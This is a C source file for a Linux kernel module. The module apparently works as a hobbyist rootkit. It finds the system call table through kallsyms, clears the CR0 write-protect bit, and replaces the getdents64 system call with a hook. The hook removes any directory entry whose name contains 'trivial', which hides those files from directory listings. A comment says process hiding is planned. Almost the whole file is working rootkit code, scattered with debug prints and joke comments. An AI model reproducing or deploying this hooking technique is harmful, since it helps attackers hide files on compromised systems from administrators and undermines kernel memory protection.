#include <linux/kallsyms.h>
#include <uapi/asm/unistd.h>
#include <linux/dirent.h>
#include <asm/page.h>
#include <linux/fs.h>
#include <uapi/linux/limits.h>
#include <linux/syscalls.h>
#include <linux/string.h>
#include <linux/slab.h>
#include <linux/kernel.h>
#include <linux/gfp.h>
#include <linux/uaccess.h>
#include <asm/uaccess.h>
#include <hooking.h>
#include <../arch/x86/include/asm/paravirt.h>
void * sys_call_table;
void * find_systable(void);
int hook_dents(void);
asmlinkage long (*old_dents)(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count);
asmlinkage long new_dents(unsigned int fd, struct linux_dirent64 __user *dirent, unsigned int count){
	printk(KERN_INFO "PLS SEE me\n");
	//amount of bois
	long ret = old_dents(fd, dirent, count);
	if (ret <= 0){
		//banned
		return ret;
	}
	//the return boi
	struct linux_dirent64 * ret_dir = kmalloc(ret, GFP_KERNEL);
	if (ret_dir ==NULL){
		return ret;
	}
	//the boi to move to kernel
	struct linux_dirent64 * ker_dir = kmalloc (ret, GFP_KERNEL);
	if (ker_dir == NULL){
		kfree(ret_dir);
		return ret;
	}
	//Yeet the dirent to kernel memory
	copy_from_user(ker_dir, dirent, ret);

	long new_len = 0;
	struct linux_dirent64 *temp;
	int offset = 0;

	while (offset < ret){
		unsigned char * cur_ref = (unsigned char *)ker_dir + offset;
		temp = (struct linux_dirent64 * )cur_ref;
		//Add hiding procs here later
		if (strstr(temp->d_name, "trivial") == NULL){
			printk(KERN_INFO "temp dname = %s\n", temp->d_name);
			//Add normal dirents to the ret dirent;
			memcpy((void *)ret_dir+new_len, temp, temp->d_reclen);
			new_len += temp->d_reclen;
		}else{
			printk(KERN_INFO "found hidden lad %s\n", temp->d_name);
		}
		offset += temp->d_reclen;
	}
	copy_to_user(dirent, ret_dir, new_len);
	kfree(ker_dir);
	kfree(ret_dir);
	return new_len;
}
void * find_systable(void){
	/*unsigned long offset = PAGE_OFFSET;
	unsigned long * systable;
	unsigned long i;

	for (i = offset; i < ULLONG_MAX; i+= 1){//sizeof(void*)){
		systable = (unsigned long *)i;
		if (systable[__NR_getdents64] == kallsyms_lookup_name("sys_getdents64")){
			return systable;
		}
	}
	return NULL;*/

	unsigned long *systable;
	systable =  kallsyms_lookup_name("sys_call_table");
	printk(KERN_INFO "PLEASE SEE ME %p", systable);
	return systable;
}
int hook_dents(void){
	if (!(sys_call_table = find_systable())){
		return -1;
	}
	printk(KERN_INFO "old boi %p", &sys_call_table[__NR_getdents64]);
	old_dents = sys_call_table[__NR_getdents64];
	printk(KERN_INFO "what is this boi %d", __NR_getdents64);
	write_cr0(read_cr0() & ~0x10000);
	//so this somehow doesn't break everythign :thinking
	sys_call_table[__NR_getdents64] = new_dents;
	write_cr0(read_cr0() | 0x10000);
	printk(KERN_INFO "looking at i=for 41 bois %p", (void *) sys_call_table[__NR_getdents64]);
	return 0;
}
